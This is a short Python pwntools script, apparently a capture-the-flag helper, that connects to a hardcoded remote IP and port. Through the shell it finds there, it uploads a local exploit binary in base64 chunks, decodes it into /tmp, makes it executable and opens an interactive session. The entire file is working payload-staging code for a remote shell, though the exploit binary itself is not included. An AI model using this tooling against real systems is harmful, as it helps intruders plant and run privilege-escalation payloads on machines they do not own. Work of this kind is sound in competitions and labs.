#!/usr/bin/env python3
from pwn import *
# from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
file = './exploit'
context.log_level = 'info'
context.newline = b'\r\n'
host, port = '103.152.118.120', 1337

# =========================================================
#                         EXPLOITS
# =========================================================
is_root = False
def run(cmd):
    ch = b'# '
    if not is_root:
        ch = b'$ '
    io.sendlineafter(ch, cmd)
    # return io.recvline()

def upload_payload():
    with open(file, 'rb') as f:
        payload = base64.b64encode(f.read()).decode()    
    for i in range(0, len(payload), 512):
        print(f'Uploading... {i:x} / {len(payload):x}')
        run(f'echo "{payload[i:i+512]}" >> /tmp/b64exp'.encode())
    run(b'base64 -d /tmp/b64exp > /tmp/exploit')
    run(b'rm /tmp/b64exp')
    run(b'chmod +x /tmp/exploit')

def exploit():
    global io
    io = remote(host, port)

    # context.log_level = 'debug'
    upload_payload()

    io.interactive()

if __name__ == '__main__':
    exploit()